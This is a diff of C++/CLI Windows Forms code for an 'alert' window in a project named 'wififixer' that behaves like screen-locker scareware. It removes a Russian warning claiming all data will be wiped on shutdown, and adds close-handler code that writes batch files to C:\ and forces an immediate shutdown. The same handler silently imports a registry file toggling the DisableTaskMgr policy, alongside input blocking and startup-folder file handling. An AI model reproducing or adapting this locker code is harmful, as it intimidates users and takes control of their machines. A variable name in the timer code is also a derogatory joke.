@@ -34,7 +34,7 @@ namespace wififixer {
 				delete components;
 			}
 		}
-	private: System::Windows::Forms::Label^ label1;
+
 	private: System::Windows::Forms::PictureBox^ pictureBox1;
 	private: System::Windows::Forms::Timer^ timer1;
 	private: System::ComponentModel::IContainer^ components;
@@ -60,30 +60,12 @@ namespace wififixer {
 		{
 			this->components = (gcnew System::ComponentModel::Container());
 			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(alert::typeid));
-			this->label1 = (gcnew System::Windows::Forms::Label());
 			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
 			this->timer1 = (gcnew System::Windows::Forms::Timer(this->components));
 			this->pictureBox2 = (gcnew System::Windows::Forms::PictureBox());
 			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
 			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->BeginInit();
 			this->SuspendLayout();
-			// 
-			// label1
-			// 
-			this->label1->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
-				| System::Windows::Forms::AnchorStyles::Left)
-				| System::Windows::Forms::AnchorStyles::Right));
-			this->label1->AutoSize = true;
-			this->label1->BackColor = System::Drawing::Color::Black;
-			this->label1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 36, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->label1->ForeColor = System::Drawing::Color::Red;
-			this->label1->Location = System::Drawing::Point(0, 301);
-			this->label1->Name = L"label1";
-			this->label1->Size = System::Drawing::Size(1100, 110);
-			this->label1->TabIndex = 1;
-			this->label1->Text = L"   При выключении ПК/Программы\r\nБУДУТ ПОЛНОСТЬЮ СТЁРТЫ ВСЕ ДАННЫЕ";
-			this->label1->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
 			// 
 			// pictureBox1
 			// 
@@ -125,7 +107,6 @@ namespace wififixer {
 			this->BackColor = System::Drawing::Color::White;
 			this->ClientSize = System::Drawing::Size(863, 602);
 			this->ControlBox = false;
-			this->Controls->Add(this->label1);
 			this->Controls->Add(this->pictureBox1);
 			this->Controls->Add(this->pictureBox2);
 			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
@@ -142,7 +123,6 @@ namespace wififixer {
 			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
 			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->EndInit();
 			this->ResumeLayout(false);
-			this->PerformLayout();
 
 		}
 	private: System::Void alert_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
@@ -151,8 +131,6 @@ namespace wififixer {
 	}
 	private: System::Void alert_Load(System::Object^ sender, System::EventArgs^ e) {
 		this->timer1->Start();
-		this->label1->Left = (this->Width - label1->Width) / 2;
-		this->label1->Top = (this->Height - label1->Height) / 2;
 	}
 	private: System::Void alert_FormClosed(System::Object^ sender, System::Windows::Forms::FormClosedEventArgs^ e) {
 		if (!right_close) {
@@ -163,56 +141,35 @@ namespace wififixer {
 			}
 			std::ofstream clear("C:\\clear.bat");
 			if (clear.is_open()) {
-				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Требуются права администратора для выполнения этого скрипта.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
+				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Administrator rights are required to run this script.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
 				clear.close();
 			}
-			std::ofstream shutdown("C:\\sleep.bat");
-			if (shutdown.is_open()) {
-				shutdown << "shutdown /s /t 00\ndel %0";
-				shutdown.close();
-			}
-			(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
-			BlockInput(false);
+			system("shutdown /s /t 00");
 			right_close = true;
+			BlockInput(false);
+			std::ofstream disable_task("C:\\1.reg");
+			if (disable_task.is_open()) {
+				disable_task << "Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]\n\"DisableTaskMgr\"=dword:00000000";
+				disable_task.close();
+				system("regedit /s C:\\1.reg >nul");
+				remove("C:\\1.reg");
+			}
 			Application::Exit();
 		}
 	}
 	private: System::Void timer1_Tick(System::Object^ sender, System::EventArgs^ e) {
-		if (this->LGBT_lover_im_gay == 0) {
-			this->label1->ForeColor = System::Drawing::Color::Red;
-			this->label1->BackColor = System::Drawing::Color::Black;
+		if (this->LGBT_lover_im_gay == 0)
 			this->pictureBox1->Visible = true;
-			this->label1->Refresh();
-		}
-		else if (this->LGBT_lover_im_gay == 1) {
-			this->label1->ForeColor = System::Drawing::Color::Orange;
-			this->label1->BackColor = System::Drawing::Color::White;
+		else if (this->LGBT_lover_im_gay == 1)
 			this->pictureBox1->Visible = false;
-			this->label1->Refresh();
-		}
-		else if (this->LGBT_lover_im_gay == 2) {
-			this->label1->ForeColor = System::Drawing::Color::Yellow;
-			this->label1->BackColor = System::Drawing::Color::Black;
+		else if (this->LGBT_lover_im_gay == 2)
 			this->pictureBox1->Visible = true;
-			this->label1->Refresh();
-		}
-		else if (this->LGBT_lover_im_gay == 3) {
-			this->label1->ForeColor = System::Drawing::Color::Green;
-			this->label1->BackColor = System::Drawing::Color::White;
+		else if (this->LGBT_lover_im_gay == 3)
 			this->pictureBox1->Visible = false;
-			this->label1->Refresh();
-		}
-		else if (this->LGBT_lover_im_gay == 4) {
-			this->label1->ForeColor = System::Drawing::Color::Blue;
-			this->label1->BackColor = System::Drawing::Color::Black;
+		else if (this->LGBT_lover_im_gay == 4)
 			this->pictureBox1->Visible = true;
-			this->label1->Refresh();
-		}
 		else if (this->LGBT_lover_im_gay == 5) {
-			this->label1->ForeColor = System::Drawing::Color::Purple;
-			this->label1->BackColor = System::Drawing::Color::White;
 			this->pictureBox1->Visible = false;
-			this->label1->Refresh();
 			this->LGBT_lover_im_gay = -1;
 		}
 		this->LGBT_lover_im_gay++;
